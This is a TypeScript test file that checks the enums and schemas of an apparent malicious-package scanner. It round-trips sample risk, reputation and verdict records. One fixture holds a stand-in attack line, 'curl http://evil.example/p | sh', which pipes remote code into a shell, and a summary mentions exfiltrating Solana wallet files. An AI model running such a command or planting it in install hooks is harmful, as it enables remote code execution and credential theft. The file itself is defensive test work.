// AC-1 from the Python multi-agent-split spec — Severity/Action enums and zod schema round-trips.

import {
  ReputationFindingSchema,
  RiskFindingSchema,
  VerdictCardSchema,
} from './contracts';
import { Action, Severity, Verdict } from './enums';

test('AC-1: Severity and Action expose the spec value sets', () => {
  expect(new Set(Object.values(Severity))).toEqual(
    new Set(['INFO', 'LOW', 'MEDIUM', 'HIGH', 'CRITICAL']),
  );
  expect(new Set(Object.values(Action))).toEqual(
    new Set(['ALLOW', 'ALLOW_WITH_WARNING', 'QUARANTINE', 'BLOCK']),
  );
});

test('AC-1: RiskFinding round-trips through schema parse', () => {
  const finding = RiskFindingSchema.parse({
    category: 'crypto_theft',
    severity: Severity.CRITICAL,
    title: 'postinstall fetches a second payload',
    file: 'scripts/install.js',
    line: 3,
    snippet: 'curl http://evil.example/p | sh',
    explanation: 'install hook downloads and executes remote code',
    confidence: 0.9,
  });
  expect(finding.category).toBe('crypto_theft');
  expect(finding.severity).toBe('CRITICAL');
  expect(RiskFindingSchema.parse(finding)).toEqual(finding);
});

test('AC-1: ReputationFinding round-trips', () => {
  const rep = ReputationFindingSchema.parse({
    source: 'osv',
    severity: Severity.HIGH,
    summary: 'GHSA-xxxx critical RCE',
    references: ['https://osv.dev/vuln/GHSA-xxxx'],
  });
  expect(rep.source).toBe('osv');
  expect(rep.references).toEqual(['https://osv.dev/vuln/GHSA-xxxx']);
  expect(ReputationFindingSchema.parse(rep)).toEqual(rep);
});

test('AC-1: VerdictCard round-trips', () => {
  const card = VerdictCardSchema.parse({
    verdict: Verdict.MALICIOUS,
    risk_score: 92,
    recommended_action: Action.BLOCK,
    summary: 'postinstall exfiltrates ~/.config/solana',
    top_findings: [],
    reputation: [],
  });
  expect(card.verdict).toBe('MALICIOUS');
  expect(card.recommended_action).toBe('BLOCK');
  expect(card.risk_score).toBe(92);
  expect(VerdictCardSchema.parse(card)).toEqual(card);
});
